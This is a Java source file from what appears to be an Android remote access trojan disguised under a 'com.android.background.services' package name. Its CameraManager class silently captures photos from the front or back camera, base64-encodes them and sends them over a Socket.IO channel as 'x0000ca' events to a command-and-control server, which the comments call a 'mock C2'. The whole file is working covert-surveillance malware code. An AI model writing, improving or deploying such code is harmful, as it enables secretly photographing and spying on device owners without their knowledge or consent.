package com.android.background.services.helpers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import com.android.background.services.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.Collections;


/**
 * Camera2-based silent photo capture (replaces the deprecated
 * {@code android.hardware.Camera} API, which is dead on modern Android).
 *
 * Every invocation produces a response on the wire: either a base64 JPEG
 * payload ({@code {"image":true,...}}) or an explicit error
 * ({@code {"image":false,"error":"..."}}) — no more silent failures.
 */
public class CameraManager {

    private static final String TAG = "CameraManager";

    private final Context context;

    public CameraManager(Context context) {
        this.context = context;
    }


    /**
     * Take a silent photo. {@code cameraID} 0 = back, 1 = front (matches the
     * ids reported by {@link #findCameraList()}). The JPEG is base64-encoded
     * and emitted as an {@code x0000ca} event so the mock C2 can save it to
     * disk without needing Engine.IO binary attachment support.
     */
    public void startUp(final int cameraID) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && context.checkSelfPermission(Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            sendError("camera permission not granted");
            return;
        }

        try {
            android.hardware.camera2.CameraManager cm =
                    (android.hardware.camera2.CameraManager) context
                            .getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) {
                sendError("no camera service");
                return;
            }

            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) {
                sendError("no cameras found");
                return;
            }

            // Resolve the requested camera (0=back, 1=front) by lens facing so
            // we're not dependent on hardware id ordering.
            int wantedFacing = (cameraID == 1)
                    ? CameraCharacteristics.LENS_FACING_FRONT
                    : CameraCharacteristics.LENS_FACING_BACK;
            String camId = null;
            for (String id : ids) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == wantedFacing) {
                    camId = id;
                    break;
                }
            }
            if (camId == null) {
                camId = ids[0];                       // fall back to first camera
            }

            final CameraCharacteristics ch = cm.getCameraCharacteristics(camId);
            final int sensorOrientation = ch.get(CameraCharacteristics.SENSOR_ORIENTATION) != null
                    ? ch.get(CameraCharacteristics.SENSOR_ORIENTATION) : 0;
            final Size size = pickJpegSize(ch.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP));
            if (size == null) {
                sendError("no capture sizes available");
                return;
            }

            final HandlerThread thread = new HandlerThread("camera2-capture");
            thread.start();
            final Handler handler = new Handler(thread.getLooper());

            final ImageReader reader = ImageReader.newInstance(
                    size.getWidth(), size.getHeight(), ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader r) {
                    Image image = null;
                    try {
                        image = r.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buf = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buf.remaining()];
                            buf.get(bytes);
                            sendPhoto(bytes, cameraID);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "image read failed", e);
                        sendError("capture read failed: " + e.getMessage());
                    } finally {
                        if (image != null) image.close();
                    }
                }
            }, handler);

            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        final CaptureRequest.Builder request =
                                camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        request.addTarget(reader.getSurface());
                        // Front cameras are mirrored: rotate +180 so the photo is upright.
                        request.set(CaptureRequest.JPEG_ORIENTATION,
                                cameraID == 1 ? (sensorOrientation + 180) % 360
                                              : sensorOrientation);
                        request.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                        camera.createCaptureSession(
                                Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        try {
                                            session.capture(request.build(), null, handler);
                                        } catch (Exception e) {
                                            Log.e(TAG, "capture failed", e);
                                            sendError("capture failed: " + e.getMessage());
                                            close(camera, reader, thread);
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {
                                        sendError("camera session configure failed");
                                        close(camera, reader, thread);
                                    }
                                }, handler);
                    } catch (Exception e) {
                        Log.e(TAG, "camera open failed", e);
                        sendError("camera open failed: " + e.getMessage());
                        close(camera, reader, thread);
                    }
                }

                @Override
                public void onDisconnected(CameraDevice camera) {
                    sendError("camera disconnected");
                    close(camera, reader, thread);
                }

                @Override
                public void onError(CameraDevice camera, int error) {
                    sendError("camera error " + error);
                    close(camera, reader, thread);
                }
            }, handler);

            // Watchdog: release everything if no frame arrives in 15s, so the
            // camera hardware is never left locked.
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    close(reader, thread);
                }
            }, 15000);

        } catch (Exception e) {
            Log.e(TAG, "startUp failed", e);
            sendError("camera init failed: " + e.getMessage());
        }
    }


    private void sendPhoto(byte[] data, int cameraID) {
        try {
            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("camera", cameraID == 1 ? "front" : "back");
            object.put("mime", "image/jpeg");
            object.put("bytes", data.length);
            object.put("base64", b64);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
            Log.i(TAG, "photo captured: " + data.length + " bytes (camera " + cameraID + ")");
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void sendError(String msg) {
        try {
            JSONObject object = new JSONObject();
            object.put("image", false);
            object.put("error", msg);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        Log.e(TAG, msg);
    }

    private void close(CameraDevice camera, ImageReader reader, HandlerThread thread) {
        try {
            if (camera != null) camera.close();
        } catch (Exception ignored) {
        }
        close(reader, thread);
    }

    private void close(ImageReader reader, HandlerThread thread) {
        try {
            if (reader != null) reader.close();
        } catch (Exception ignored) {
        }
        try {
            if (thread != null) thread.quitSafely();
        } catch (Exception ignored) {
        }
    }


    /**
     * Pick the largest JPEG size that fits within ~1920x1080 to keep the
     * base64 payload small; if every size is larger, use the smallest one.
     */
    private Size pickJpegSize(StreamConfigurationMap map) {
        if (map == null) return null;
        Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
        if (sizes == null || sizes.length == 0) return null;
        Size best = null;
        for (Size s : sizes) {
            long area = (long) s.getWidth() * s.getHeight();
            if (area <= 1920L * 1080L
                    && (best == null || area > (long) best.getWidth() * best.getHeight())) {
                best = s;
            }
        }
        if (best == null) {
            best = sizes[0];
            for (Size s : sizes) {
                if ((long) s.getWidth() * s.getHeight()
                        < (long) best.getWidth() * best.getHeight()) {
                    best = s;
                }
            }
        }
        return best;
    }


    /**
     * Enumerate cameras via Camera2. Returns the same shape as before:
     * {@code {"camList":true,"list":[{"name":"Back","id":0},...]}} with
     * id 0 = back, id 1 = front for compatibility with the dashboard.
     */
    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            android.hardware.camera2.CameraManager cm =
                    (android.hardware.camera2.CameraManager) context
                            .getSystemService(Context.CAMERA_SERVICE);
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            if (cm != null) {
                String[] ids = cm.getCameraIdList();
                for (int i = 0; i < ids.length; i++) {
                    CameraCharacteristics ch = cm.getCameraCharacteristics(ids[i]);
                    Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                    JSONObject jo = new JSONObject();
                    if (facing != null
                            && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        jo.put("name", "Front");
                        jo.put("id", i);
                    } else if (facing != null
                            && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        jo.put("name", "Back");
                        jo.put("id", i);
                    } else {
                        jo.put("name", "Other");
                        jo.put("id", i);
                    }
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            return cameras;

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}
